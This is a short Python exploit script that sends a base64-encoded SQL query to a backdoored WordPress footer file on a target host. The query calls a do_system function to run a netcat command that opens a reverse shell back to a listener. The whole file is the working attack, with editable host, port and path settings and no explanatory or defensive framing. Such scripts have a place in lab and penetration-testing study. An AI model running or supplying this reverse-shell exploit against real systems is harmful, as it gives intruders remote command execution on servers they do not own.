#!/usr/bin/python3
import requests
import base64

lhost = '192.168.1.90'                  # edit this to your listening host
lport = '9001'                          # edit this to your listening port
rhost = '192.168.1.115'                 # edit this to the remote host
rprotocol = 'http'                      # edit this to change to https
rport = '80'                            # edit this to change remote port
rpath = '/wordpress/wp-blog-footer.php' # edit this to change remote path

url = rprotocol + '://' + rhost + ':' + rport + rpath 
query = 'select do_system(\'nc ' + lhost + ' ' + lport + ' -e /bin/bash\');'
payload = base64.b64encode(query.encode('ascii'))
postData = {'f': payload}
answer = requests.post(url, data = postData, verify=False)
print(answer.text)


